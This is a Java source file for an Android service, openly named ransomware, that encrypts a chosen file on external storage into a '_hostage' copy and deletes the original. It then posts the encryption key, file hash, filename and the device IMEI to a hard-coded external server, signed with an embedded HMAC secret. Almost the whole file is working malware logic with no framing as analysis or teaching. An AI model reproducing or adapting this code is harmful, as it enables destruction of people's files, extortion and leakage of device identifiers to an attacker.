package com.ransom.ransomwarer;

import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

import org.apache.http.HttpEntity;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreProtocolPNames;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.google.common.hash.Hashing;
import com.google.common.io.Files;

public class MainService extends IntentService {
	private String ACTION = "com.ransom.ransomwarer.action.RANSOM_ACTION";

	public MainService() {
		super("RansomwareService");
	}

	public MainService(String name) {
		super(name);
	}

	private class KeyFilePair {
		public KeyFilePair(String fileName, String fileDigest, String key) {
			super();
			this.fileName = fileName;
			this.fileDigest = fileDigest;
			this.key = key;
		}

		public String fileName;
		public String fileDigest;
		public String key;
	}

	private class CipherTask extends AsyncTask<File, String, Void> {
		private static final String URL = "http://www.tcbpg.com.ar/endpoint.php";
		private final SecretKeySpec keySpec = 
				new SecretKeySpec("qnsXcdaBFQIhAUPY44oiexBdkjAABQjqk120sdi0".getBytes(),"HmacSHA1");

		private void sendKeyToServer(KeyFilePair p) {
			try {
				HttpPost post = new HttpPost(URL);
				HttpClient client = new DefaultHttpClient();
				client.getParams().setParameter(
						CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);

				List<NameValuePair> content = new ArrayList<NameValuePair>();
				content.add(new BasicNameValuePair("messageType","ransom"));
				String messageBody = String.format("{\"sha1\":\"%s\",\"pwd\":\"%s\",\"filename\":\"%s\"}", 
						p.fileDigest,p.key.trim(),p.fileName);
									
				content.add(new BasicNameValuePair("messageBody", messageBody));
				
				TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				String imei = t.getDeviceId();
				content.add(new BasicNameValuePair("imei",imei));

				final String format = "yyyy-MM-dd HH:mm:ss.SSSZ";
				SimpleDateFormat sdf = new SimpleDateFormat(format, Locale.US);
				sdf.setTimeZone(TimeZone.getTimeZone("UTC"));
				String timestamp = sdf.format(Calendar.getInstance().getTime());
				content.add(new BasicNameValuePair("timestamp",timestamp));
				
				Mac m;
				try {
					m = Mac.getInstance("HmacSHA1");
					m.init(keySpec);
				} catch (NoSuchAlgorithmException e1) {
					Log.d("RANSOMWARER","Unknown HMAC algorithm");
					Log.e("RANSOMWARER","NoSuchAlgorithm",e1);
					return;
				} catch (InvalidKeyException e) {
					Log.d("RANSOMWARER","Invalid Key Exception");
					Log.e("RANSOMWARER","InvalidKeyException",e);
					return;
				}

				String total = "ransom" + messageBody + imei + timestamp;
				String hmac = Base64.encodeToString(m.doFinal(total.getBytes()),Base64.DEFAULT);

				content.add(new BasicNameValuePair("hmac",hmac));					
				HttpEntity e = new UrlEncodedFormEntity(content);
				post.setEntity(e);
				
				client.execute(post);
			} catch (Exception e) {
				Log.e("RANSOMWARER", "Exception sending data: ", e);
			}
		}

		protected Void doInBackground(File... files) {
			KeyProvider provider = new CacheGeneratorKeyProvider();
			RansomwareHandler handler = new RansomwareHandler(provider);

			try {
				handler.encrypt(files[0], files[1]);
			} catch (Exception e) {
				Log.e("RANSOMWARER", "Exception", e);
				return null;
			}

			files[0].delete();
			
			String result = Base64.encodeToString(provider.getKey().getEncoded(), Base64.DEFAULT);
			sendKeyToServer(new KeyFilePair(files[0].getName(), computeSHA1(files[1]),result));
			return null;
		}

		private String computeSHA1(File file) {
			try {
				return Files.hash(file, Hashing.sha1()).toString();
			} catch (IOException e) {
				return "";
			}
		}

	}

	@Override
	protected void onHandleIntent(Intent intent) {
		String action = intent.getAction();
		String type = intent.getType();
		if (ACTION.equals(action) && "ransom/note".equals(type)) {
			File root = Environment.getExternalStorageDirectory();
			String sharedText = intent.getStringExtra(Intent.EXTRA_TEXT);

			new CipherTask().execute(new File(root, sharedText), new File(root,
					sharedText + "_hostage"));
		}
	}
}
